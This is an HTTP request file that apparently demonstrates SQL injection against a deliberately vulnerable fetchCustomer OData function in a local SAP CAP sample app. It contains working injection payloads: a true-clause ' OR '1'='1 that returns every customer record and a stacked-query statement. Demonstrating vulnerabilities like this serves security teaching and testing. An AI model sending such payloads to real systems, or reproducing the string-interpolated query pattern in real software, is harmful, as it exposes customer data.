@server=http://localhost:4004
@username=incident.support@tester.sap.com
@password=initial

### ðŸ”’ SQL INJECTION VULNERABILITY DEMO
# =====================================================
# VULNERABLE: Custom fetchCustomer OData Function
# This demonstrates SQL injection in CAP services
# The function uses direct string interpolation in services.js
# =====================================================

  ### âœ… Test 1: Legitimate Customer Lookup
  ### Action: Normal request with valid customer ID
  ### Expected: Returns single customer record
  ### Result: System returns data for customer ID 1004100
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  {
    "customerID": "1004100"
  }
  
  ### ðŸš¨ Test 2: SQL Injection True-Clause Attack
  ### Action: Inject malicious payload ' OR '1'='1
  ### Expected: Returns ALL customer records
  ### Result: Full database exposure vulnerability
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  {
    "customerID": "1004100' OR '1'='1"
  }

  ### ðŸš¨ Test 3: SQL Injection -  multiple sql statements
  ### Payload: 'UNION SELECT * FROM Customers --"   (multiple sql statements)
  ### Expected: Returns empty array
  GET  {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}

{
     "customerID": "1004100'; SELECT * from sap_capire_incidents_Customers;-- "
}
